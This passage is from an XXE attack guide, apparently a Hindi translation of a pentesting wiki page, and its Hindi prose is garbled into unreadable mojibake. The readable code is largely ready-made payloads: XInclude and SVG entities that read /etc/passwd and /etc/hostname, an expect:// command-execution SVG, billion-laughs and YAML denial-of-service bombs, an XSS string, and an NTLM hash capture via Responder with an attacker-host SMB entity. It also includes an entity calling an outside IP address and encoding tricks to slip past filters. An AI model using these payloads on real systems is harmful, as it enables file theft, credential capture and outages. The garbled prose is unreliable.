рдЕрд╡рд╢реНрдпрдВрднрд╛рд╡реА рд░реВрдк рд╕реЗ рдХрдо рд╕реЗ рдХрдо рдПрдХ XML рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

рдЗрд╕ рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рдХрддрд╛ рдХреА рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП, рдПрдХ **рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ XXE рдкреЗрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛ**ред рдкрд╣рд▓рд╛ рдХрджрдо рдПрдХ рдЦрд╛рд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдЕрдирдЬрд╝рд┐рдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЬрдм рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдЕрдирдЬрд╝рд┐рдк рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ `./unzipped/word/document.xml` рдкрд░ рд╕реНрдерд┐рдд XML рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рдкрд╕рдВрджреАрджрд╛ рдкрд╛рда рд╕рдВрдкрд╛рджрдХ (рдЬреИрд╕реЗ vim) рдореЗрдВ рдЦреЛрд▓рдХрд░ рд╕рдВрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред XML рдХреЛ рдЬреАрд╡рдВрд╢ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЕрдХреНрд╕рд░ рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИред

рд╕рдВрд╢реЛрдзрд┐рдд XML рд▓рд╛рдЗрдиреЗрдВ рджреЛ рдЬрдбрд╝ XML рдСрдмреНрдЬ
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP рдлрд╝рд╛рдЗрд▓реНрд╕ рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдирд╛ **XXE рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрд┐рд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд┐рд╕реНрдЯрдо DTD рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред** [рдЗрд╕ рдЦрдВрдб рдХреЛ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо DTD рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдП](xxe-xee-xml-external-entity.md#error-based-system-dtd)ред
{% endhint %}

#### рдкрд░рджреЗ рдХреЗ рдкреАрдЫреЗ

1. рдпрд╣ рдЬрд╝рд┐рдк рдЖрд░реНрдХрд╛рдЗрд╡ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рдмрдирд╛рддрд╛ рд╣реИред `https://download.host.com/myarchive.zip`
2. рдпрд╣ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рд╕реНрдерд╛рди рдкрд░ рд╕рд╣реЗрдЬрддрд╛ рд╣реИред `/tmp/...`
3. рдпрд╣ рдЖрд░реНрдХрд╛рдЗрд╡ рдХрд╛ рдЕрднрд┐рдирд┐рд╖реНрдард╛рди рдХрд░рддрд╛ рд╣реИред
4. рдпрд╣ `file.zip` рдХреЛ рдкрдврд╝рддрд╛ рд╣реИред
5. рдпрд╣ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдЯрд╛рддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рджреВрд╕рд░реЗ рд╕реНрдЯреЗрдк рдореЗрдВ рдлреНрд▓реЛ рдХреЛ рд░реЛрдХрдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рдЯреНрд░рд┐рдХ рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕реЗрд╡ рдХрд░рддреЗ рд╕рдордп рдХрдиреЗрдХреНрд╢рди рдХреЛ рдХрднреА рдмрдВрдж рди рдХрд░реЗрдВред [рдпрд╣ рдЙрдкрдХрд░рдг рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): рдПрдХ рдкрд╛рдпрдерди рдореЗрдВ `slow_http_server.py` рдФрд░ рдПрдХ рдЬрд╛рд╡рд╛ рдореЗрдВ `slowserver.jar`.

рдЬрдм рд╕рд░реНрд╡рд░ рдиреЗ рдЖрдкрдХреА рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд▓реА рд╣реЛ, рддреЛ рдЖрдкрдХреЛ рдЙрд╕рдХреА рд╕реНрдерд╛рди рдХреЛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЕрд╕реНрдерд╛рдпреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рдХреЗ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг, рдлрд╝рд╛рдЗрд▓ рдкрде рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдирд╛ рдПрдХ рдФрд░ рднреЗрджрднрд╛рд╡ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкрде рдЕрднрд┐рд╡рд░реНрддрди (рдЬреИрд╕реЗ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢, рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдиреНрдЬреЗрдХреНрд╢рди, XSLT RCE, рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди, рдЖрджрд┐) рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### рдбреАрдУрдПрд╕

#### рдмрд┐рд▓рд┐рдпрди рд╣рдВрд╕реА рд╣рдорд▓рд╛
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml рд╣рдорд▓рд╛
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### рдЪреМрдХрд╕ рдмреНрд▓реЛрдЕрдк рд╣рдорд▓рд╛

![](<../.gitbook/assets/image (531).png>)

#### NTML рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

Windows рд╣реЛрд╕реНрдЯ рдкрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ NTML рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдПрдХ responder.py рд╣реИрдВрдбрд▓рд░ рд╕реЗрдЯ рдХрд░рдХреЗ:
```
Responder.py -I eth0 -v
```
рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Then you can try to crack the hash using hashcat

## рдЫрд┐рдкреА рд╣реБрдИ XXE рд╕рддрд╣реЗрдВ

### XInclude

рдХреБрдЫ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ, **рдХреНрд▓рд╛рдЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рд╕реЗ рдкрд╣рд▓реЗ**ред рдпрд╣ рд╕рд╛рдорд╛рдиреНрдпрдд: рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ **рдмреИрдХрдПрдВрдб SOAP рдЕрдиреБрд░реЛрдз** рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ рдмреИрдХрдПрдВрдб рдкрд░ SOAP рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрди рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдкрд╛рд░рдВрдкрд░рд┐рдХ XXE (XML External Entity) рд╣рдорд▓рд╛ рдХрд░рдирд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЗ рдкреВрд░реНрдгрддрд╛ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рдХрдо рд╣реЛрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `DOCTYPE` рддрддреНрд╡ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдпрд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд░рдиреЗ рдХреА рдЕрдХреНрд╖рдорддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, `XInclude` рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛, XML рдорд╛рдирдХ рдХрд╛ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рдЬреЛ рдПрдХ XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЛ рдЫреЛрдЯреЗ рдЙрдк-рджрд╕реНрддрд╛рд╡реЗрдЬ рд╕реЗ рдмрдирд╛рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рджреЗрддреА рд╣реИ, рдПрдХ рдЙрдкрд╛рдп рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдПрдХ XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдХреЗ рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рддрддреНрд╡ рдореЗрдВ `XInclude` рд╣рдорд▓реЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╕рд░реНрд╡рд░-рдЬрдирд┐рдд XML рджрд╕реНрддрд╛рд╡реЗрдЬ рдореЗрдВ рдПрдХ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдбреЗрдЯрд╛ рдЯреБрдХрдбрд╝реЗ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд╣реЛрддрд╛ рд╣реИред

`XInclude` рд╣рдорд▓рд╛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `XInclude` рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рд╕рд╛рде рд╣реА рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдкрде рдХрд╛ рдирд┐рд░реНрджреЗрд╢рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдРрд╕рд╛ рд╣рдорд▓рд╛ рдХреИрд╕реЗ рд╕рдВрд░рдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) рджреЗрдЦреЗрдВ!

### SVG - рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб

рдЙрди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдЬреЛ рдлрд┐рд░ рд╕рд░реНрд╡рд░ рдкрд░ рдкреНрд░реЛрд╕реЗрд╕ рдХреА рдЬрд╛рддреА рд╣реИрдВ, XML рдпрд╛ XML-рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреЛ рдХреИрд╕реЗ рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдореЗрдВ рдХрдорд┐рдпреЛрдВ рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдСрдлрд┐рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ (DOCX) рдФрд░ рдЫрд╡рд┐рдпреЛрдВ (SVG) рдЬреИрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдлрд╝рд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк XML рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдПрдВ **рдЫрд╡рд┐рдпрд╛рдБ рдЕрдкрд▓реЛрдб** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпреЗ рдЫрд╡рд┐рдпрд╛рдБ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреНрд░реЛрд╕реЗрд╕ рдпрд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред PNG рдпрд╛ JPEG рдЬреИрд╕реЗ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рднреА, **рд╕рд░реНрд╡рд░ рдХреА рдЫрд╡рд┐ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдкреБрд╕реНрддрдХрд╛рд▓рдп рднреА SVG рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░ рд╕рдХрддреА рд╣реИ**ред SVG, рдЬреЛ рдПрдХ XML-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рд╛рд░реВрдк рд╣реИ, рд╣рдорд▓рд╛рд╡рд╛рджрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реЗ рджреБрд░реБрдкрдпреЛрдЧреА SVG рдЫрд╡рд┐рдпрд╛рдБ рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХреЗрдВ, рдЬрд┐рд╕рд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ XXE (XML External Entity) рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрд░рд╣ рдХреЗ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА SVG рдЫрд╡рд┐ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
рдПрдХ рдФрд░ рддрдХрдиреАрдХ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕рдореЗрдВ PHP "expect" рд╡реНрд░рд╛рдкрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
рджреЛрдиреЛрдВ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, SVG рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд░реНрд╡рд░ рдХреЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА XML рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдордЬрдмреВрдд рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) рджреЗрдЦреЗрдВ!

**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрдврд╝реЗ рдЧрдП рдлрд╝рд╛рдЗрд▓ рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдпрд╛ рдирддреАрдЬреЗ рдХрд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдирд┐рд░реНрдорд┐рдд рдЫрд╡рд┐ рдХреЗ рдЕрдВрджрд░ рджрд┐рдЦрд╛рдИ рджреЗрдЧреАред рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрд╕ рдЫрд╡рд┐ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред**

### **PDF - рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб**

**рдПрдХ PDF рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ XXE рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд░реЗрдВ** рдЗрд╕реЗ рдЕрднрд┐рдпрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded рд╕реЗ XML рддрдХ

рдпрджрд┐ рдПрдХ POST рдЕрдиреБрд░реЛрдз XML рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдбреЗрдЯрд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ XXE рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдорд┐рд▓ рд╣реИ:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
рддреЛ рдлрд┐рд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣реА рдкрд░рд┐рдгрд╛рдо рдорд┐рд▓реЗрдЧрд╛:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON рд╕реЗ XEE рддрдХ

рдЕрдиреБрд░реЛрдз рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдПрдХ рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╣реИ "**Content Type Converter**". [рдпрд╣рд╛рдБ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) рдЖрдк рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

## WAF рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЕрд╡рд░реЛрдз

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
рдпрд╣ рдХреЗрд╡рд▓ рддрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЕрдЧрд░ XML рд╕рд░реНрд╡рд░ `data://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред

### UTF-7

рдЖрдк рдпрд╣рд╛рдБ \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 